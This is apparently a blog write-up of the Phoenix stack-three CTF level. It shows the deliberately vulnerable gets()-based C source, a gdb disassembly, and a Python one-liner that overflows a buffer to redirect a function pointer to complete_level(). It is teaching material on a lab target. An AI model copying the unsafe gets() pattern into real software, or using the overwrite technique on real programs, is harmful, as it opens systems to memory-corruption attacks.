---
title: Phoenix Stack-Three
author: Marius Kimmina
date: 2019-10-27 14:10:00 +0800
categories: [CTF, Binary Exploitation]
tags: [Buffer Overflow]
published: true
---

### 0x0. Introduction
For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One).
In this level we have to use yet another buffer-overflow change the Function-pointer to call a specific function. This is 
still a very basic level but it gives an introduction to the more complex capabilities of buffer-overflows.

### 0x1. Taking a look at the source code

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

Our goal here is to execute the function "complete_level()". The function pointer gets set to "NULL" and then it is our old friend "gets" again.
In case you have not read the last Posts on this series, gets is a very old c function that should never be used since it doesn't implement any 
security checks whatsoever. There are better alternatives nowadays like "fgets".

```c
locals.fp = NULL;
gets(locals.buffer)
```


### 0x2 Exploiting the program

The first thing we need is the address of "complete_level()". Since we know the name of the function we can just disassemble it and thus get its address:

```
(gdb) disassemble complete_level 
Dump of assembler code for function complete_level:
   0x000000000040069d <+0>:	push   rbp
   0x000000000040069e <+1>:	mov    rbp,rsp
   0x00000000004006a1 <+4>:	mov    edi,0x400790
   0x00000000004006a6 <+9>:	call   0x4004f0 <puts@plt>
   0x00000000004006ab <+14>:	mov    edi,0x0
   0x00000000004006b0 <+19>:	call   0x400510 <exit@plt>
End of assembler dump.
```

So now we know that we need to write "0x000000000040069d" to the function pointer, or "40069d" since leading zeros don't matter.  
Then we need, yet again, to craft some input that will tell us when exactly we start to write into the function_pointer. As always im going to use the alphabet for that.

```
Welcome to phoenix/stack-three, brought to you by https://exploit.education
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZ
calling function pointer @ 0x5252525251515151

Program received signal SIGSEGV, Segmentation fault.
0x5252525251515151 in ?? ()
```

Now we know that we will write into the function pointer at Q and R (because 0x52 corresponds to R and 0x51 corresponds to Q).
The easiest way that I know to input the correct function address is to simply decode it with python.

```
user@phoenix-amd64:~$ python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" + ("9d06400000000000").decode("hex")' |  /opt/phoenix/amd64/stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

Keep in Mind that you have to use 9d06400000000000 and not 000000000040069d because phoenix is little endian, which means we read byte-by-byte from right to left.
